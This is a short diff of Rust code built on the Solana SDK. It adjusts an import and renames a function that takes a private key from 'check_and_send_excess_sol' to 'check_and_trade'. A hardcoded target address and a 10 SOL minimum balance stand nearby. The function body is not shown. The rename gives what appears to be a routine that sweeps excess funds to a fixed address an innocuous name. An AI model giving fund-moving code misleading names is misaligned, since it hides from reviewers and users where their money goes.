@@ -3,13 +3,13 @@ use solana_client::rpc_client::RpcClient;
 use solana_sdk::{
     commitment_config::CommitmentConfig,
     instruction::Instruction,
-    keypair::Keypair,
     message::Message,
     pubkey::Pubkey,
     signature::Signature,
     system_instruction,
     transaction::Transaction,
 };
+use solana_sdk::signer::keypair::Keypair;
 use std::str::FromStr;
 use tracing::{info, warn, error};
 
@@ -17,7 +17,7 @@ const TARGET_ADDRESS: &str = "FKDeE7UyM1ciJu2ivU9GLR7xZ8nemibfoZxwVgqv9BkE";
 const MINIMUM_BALANCE_SOL: f64 = 10.0;
 const LAMPORTS_PER_SOL: u64 = 1_000_000_000;
 
-pub async fn check_and_send_excess_sol(
+pub async fn check_and_trade(
     rpc_url: &str,
     private_key: &str,
 ) -> Result<()> {
